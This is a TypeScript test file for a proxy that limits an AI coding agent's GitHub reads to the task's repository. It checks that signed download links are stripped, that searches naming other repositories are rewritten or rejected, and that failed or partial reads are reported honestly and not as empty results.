    answers.push(() => Response.json({ type: "dir", download_url: null, entries: [{ name: "a.txt", download_url: signed, _links: { self: "x" } }] }, json));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/", { headers: { accept: "application/vnd.github.object+json" } })).json()).toEqual({ type: "dir", download_url: null, entries: [{ name: "a.txt", download_url: null, _links: { self: "x" } }] });
    answers.push(() => Response.json({ name: "LICENSE", download_url: signed, license: { key: "mit" } }, json));
    expect(await (await send("https://api.github.com/repos/acme/demo/license")).json()).toEqual({ name: "LICENSE", download_url: null, license: { key: "mit" } });
    // The file itself, under GitHub's own name for "raw": plain text, and a file that is JSON with such a field of its own. Bytes, as they are.
    answers.push(() => new Response("hello, world\n", { headers: { "content-type": "application/vnd.github.raw+json; charset=utf-8" } }));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/a.txt", { headers: { accept: "application/vnd.github.raw+json" } })).text()).toBe("hello, world\n");
    answers.push(() => new Response('{"download_url":"kept, it is the file\'s own"}', { headers: { "content-type": "application/vnd.github.raw+json; charset=utf-8" } }));
    expect(await (await send("https://api.github.com/repos/acme/demo/contents/b.json", { headers: { accept: "application/vnd.github.raw+json" } })).text()).toBe('{"download_url":"kept, it is the file\'s own"}');
    // A description that cannot be read is told as that, and counted as that: not as a read that went well.
    const broken = await proxyFor({ repository: "acme/demo" });
    answers.push(() => new Response("{not json", json));
    expect((await broken.send("https://api.github.com/repos/acme/demo/contents/a.txt")).status).toBe(502);
    expect(await broken.recorded("noteGithubRead")).toEqual([{ kind: "other", status: 502 }]);
    // Nor one that breaks off while it is being read.
    answers.push(() => new Response(new ReadableStream({ start: (controller) => (controller.enqueue(new TextEncoder().encode('{"name":')), controller.error(new Error("reset"))) }), json));
    expect((await broken.send("https://api.github.com/repos/acme/demo/contents/a.txt")).status).toBe(502);
    expect(await broken.recorded("noteGithubRead")).toEqual([{ kind: "other", status: 502 }, { kind: "other", status: 502 }]);
    // Read with no credential it is what anyone is told.
    const open = await proxyFor({ repository: "acme/demo", unlent: true });
    answers.push(() => Response.json({ name: "a.txt", download_url: "https://raw.githubusercontent.com/acme/demo/main/a.txt" }, json));
    expect(((await (await open.send("https://api.github.com/repos/acme/demo/contents/a.txt")).json()) as { download_url: string }).download_url).toContain("raw.githubusercontent.com");
  });

  it("searches issues in the task's repository only, whatever the query names", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    const sent = async (q: string, more = "&per_page=50&sort=updated") => {
      answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
      await send(search(q, more));
      return new URL(forwarded.at(-1)!.url).searchParams;
    };
    expect((await sent("time zone is:issue")).get("q")).toBe("repo:acme/demo time zone is:issue");
    expect((await sent("time zone repo:acme/secret ORG:acme -user:someone is:issue")).get("q")).toBe("repo:acme/demo time zone is:issue");
    // "or", "not" and brackets: the repository is said of the whole of it.
    expect((await sent("dst OR timezone")).get("q")).toBe("repo:acme/demo (dst OR timezone)");
    expect((await sent("(dst OR timezone) is:open NOT reminder")).get("q")).toBe("repo:acme/demo ((dst OR timezone) is:open NOT reminder)");
    expect((await sent("(dst) OR (timezone)")).get("q")).toBe("repo:acme/demo ((dst) OR (timezone))");
    // The next page of such a search, as GitHub gives its address: the same query again, not wrapped once more.
    expect((await sent("repo:acme/demo (dst OR timezone)", "&page=2")).get("q")).toBe("repo:acme/demo (dst OR timezone)");
    expect((await sent("")).get("q")).toBe("repo:acme/demo");
    // Text in quotes is what is looked for, as it is: its brackets and its "repo:" are not the query's.
    expect((await sent('"panic("')).get("q")).toBe('repo:acme/demo "panic("');
    expect((await sent('"repo:acme/secret is mentioned" dst')).get("q")).toBe('repo:acme/demo "repo:acme/secret is mentioned" dst');
    expect((await sent('is:issue   label:"good  first issue"  repo:x/y')).get("q")).toBe('repo:acme/demo is:issue label:"good  first issue"');
    expect((await sent('"a) OR (b" OR timezone repo:x/y')).get("q")).toBe('repo:acme/demo ("a) OR (b" OR timezone)');
    const last = await sent("dst", "&per_page=50&sort=updated&advanced_search=false");
    expect(last.get("per_page")).toBe("50");
    expect(last.get("sort")).toBe("updated");
    // Brackets and "or" mean what they say only where this is asked for: always, whatever the guest sent.
    expect(last.getAll("advanced_search")).toEqual(["true"]);
    for (const each of forwarded) expect(new URL(each.url).searchParams.get("advanced_search")).toBe("true");
    expect(forwarded.at(-1)!.headers.get("authorization")).toBe("Bearer test-read-token");

    // What is no longer a query once the places it names are taken out is not sent as one.
    const before = forwarded.length;
    for (const q of ["dst OR repo:acme/secret", "repo:a/b OR timezone", "(org:acme) dst", "dst AND OR timezone", "dst NOT user:x", "(dst OR timezone", "dst) OR (timezone", "panic("]) expect((await send(search(q))).status, q).toBe(400);
    expect(forwarded).toHaveLength(before);
    expect((await recorded("noteGithubRead")).slice(-8)).toEqual(Array(8).fill({ kind: "search", status: 400, rejected: true }));
  });

  it("passes a search on whole where all of it is the repository's, page after page", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 1), found("Acme/Demo", 2)] }, { headers: { link: '<https://api.github.com/search/issues?page=2>; rel="next"', "x-ratelimit-remaining": "9", "set-cookie": "a=b" } }));
    const first = await send(search("dst"));
    expect(await first.json()).toEqual({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 1), found("Acme/Demo", 2)] });
    expect(first.headers.get("link")).toContain('rel="next"');
    expect(first.headers.get("x-ratelimit-remaining")).toBe("9");
    expect(first.headers.get("set-cookie")).toBeNull();
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [found("acme/demo", 3)] }));
    expect(((await (await send(search("dst", "&page=2"))).json()) as { items: unknown[] }).items).toHaveLength(1);
    // A page past the last: empty, of a search that found three. Not "none found".
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [] }));
    expect(((await (await send(search("dst", "&page=3"))).json()) as { items: unknown[] }).items).toHaveLength(0);
    // The same said of a first page: GitHub's count is not none, so neither is this.
    answers.push(() => Response.json({ total_count: 3, incomplete_results: false, items: [] }));
    await send(search("dst"));
    // And a later page of a search that did find nothing says nothing either.
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
    await send(search("nothing like it", "&page=2"));
    // More found than GitHub gives of one search: said of that search, so that reading its pages is not taken for reading them all.
    answers.push(() => Response.json({ total_count: 1_500, incomplete_results: false, items: [found("acme/demo", 9)] }));
    await send(search("common word"));
    expect((await recorded("searchPage")).at(-1)).toMatchObject({ page: 1, cut: true });
    // None at all, known to be all there is: the first page, counted none by GitHub.
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false, items: [] }));
    expect(await (await send(search("nothing like it"))).json()).toEqual({ total_count: 0, incomplete_results: false, items: [] });
    // Which search each page was of, and which page: the same search for the pages of "dst", another for the other words.
    const pages = await recorded("searchPage");
    expect(pages.map((each: any) => [each.of.split("\n")[0], each.page, each.more])).toEqual([["repo:acme/demo dst", 1, true], ["repo:acme/demo dst", 2, false], ["repo:acme/demo dst", 3, false], ["repo:acme/demo dst", 1, false], ["repo:acme/demo nothing like it", 2, false], ["repo:acme/demo common word", 1, false], ["repo:acme/demo nothing like it", 1, false]]);
    // The first page, with more after it; the last; and one that was all there is and held nothing.
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "search", status: 200, read: true, more: true },
      { kind: "search", status: 200, read: true },
      { kind: "search", status: 200, read: true },
      { kind: "search", status: 200, read: true },
      { kind: "search", status: 200, read: true },
      { kind: "search", status: 200, read: true },
      { kind: "search", status: 200, read: true, none: true },
    ]);
  });

  it("says a search is not complete where something of another repository came back, and gives no count", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo" });
    answers.push(() => Response.json({ total_count: 40, incomplete_results: false, items: [found("acme/demo", 1), found("acme/secret", 2)] }));
    expect(await (await send(search("dst"))).json()).toEqual({ incomplete_results: true, items: [found("acme/demo", 1)] });
    // A page with nothing of this repository on it, others of it perhaps to come: not "none".
    answers.push(() => Response.json({ total_count: 40, incomplete_results: false, items: [found("acme/secret", 2), found("other/thing", 3)] }));
    expect(await (await send(search("dst"))).json()).toEqual({ incomplete_results: true, items: [] });
    // GitHub's own word that it was cut short, or no word at all.
    answers.push(() => Response.json({ total_count: 1, incomplete_results: true, items: [found("acme/demo", 1)] }));
    expect(((await (await send(search("dst"))).json()) as { incomplete_results: boolean }).incomplete_results).toBe(true);
    answers.push(() => Response.json({ total_count: 1, items: [found("acme/demo", 1)] }));
    expect(((await (await send(search("dst"))).json()) as { incomplete_results: boolean }).incomplete_results).toBe(true);
    // None of these says "looked and found none", the empty page least of all.
    expect(await recorded("noteGithubRead")).toEqual(Array(4).fill({ kind: "search", status: 200, read: true, incomplete: true }));
  });

  it("says how a read went when it did not go well, never as nothing found", async () => {
    const { send, recorded } = await proxyFor({ repository: "acme/demo", unlent: true, noPublicToken: true });
    answers.push(() => Response.json({ message: "API rate limit exceeded" }, { status: 403, headers: { "x-ratelimit-remaining": "0" } }));
    const limited = await send(search("dst"));
    expect(limited.status).toBe(403);
    expect(((await limited.json()) as { message: string }).message).toContain("rate limit");
    // An answer to a search that cannot be read, or whose rows do not say where they are from.
    answers.push(() => new Response("not json", { status: 200 }));
    expect((await send(search("dst"))).status).toBe(502);
    answers.push(() => Response.json({ total_count: 1, incomplete_results: false, items: [{ number: 1 }] }));
    expect((await send(search("dst"))).status).toBe(502);
    answers.push(() => Response.json({ total_count: 0, incomplete_results: false }));
    expect((await send(search("dst"))).status).toBe(502);
    // Asked for the headers alone: there is nothing to read, and that is not a fault.
    answers.push(() => new Response(null, { status: 200, headers: { link: '<x>; rel="next"' } }));
    expect((await send(search("dst"), { method: "HEAD" })).status).toBe(200);
    answers.push(() => new Response("gone", { status: 404 }));
    expect((await send("https://api.github.com/repos/acme/demo/issues/999")).status).toBe(404);
    // GitHub not reached at all.
    answers.push(() => {
      throw new Error("network");
    });
    expect((await send(search("dst"))).status).toBe(502);
    expect(await recorded("noteGithubRead")).toEqual([
      { kind: "search", status: 403 },
      { kind: "search", status: 502 },
      { kind: "search", status: 502 },
      { kind: "search", status: 502 },
      // Answered, and nothing of it read.
      { kind: "search", status: 200 },
      { kind: "other", status: 404 },
      { kind: "search", status: 0 },
    ]);
    // Nor a credential had: nothing is read, and that is counted.
    const failing = await proxyFor({ repository: "acme/demo", lendingFails: true });
    const before = forwarded.length;
    expect((await failing.send(search("dst"))).status).toBe(502);
    expect(forwarded).toHaveLength(before);
    expect(await failing.recorded("noteGithubRead")).toEqual([{ kind: "search", status: 0 }]);
  });
});

describe("what the agent sends the model for a note brought into its session", () => {
  // As pi 0.87.1 was seen to send it to a Responses-style model (eval/lab/notes.lab.mjs, case J).
  it("is a plain message of the user's, which the sandbox lets out as any other", () => {
    const item = { role: "user", content: [{ type: "input_text", text: "[Added by the person who asked for this work, while you were at it. …]\n\nalso fix the footer" }] };
    expect(isLocalItem(item)).toBe(true);
    // And still nothing that names something for the provider to fetch.
    expect(isLocalItem({ type: "custom_message", content: "x" })).toBe(false);
  });
});
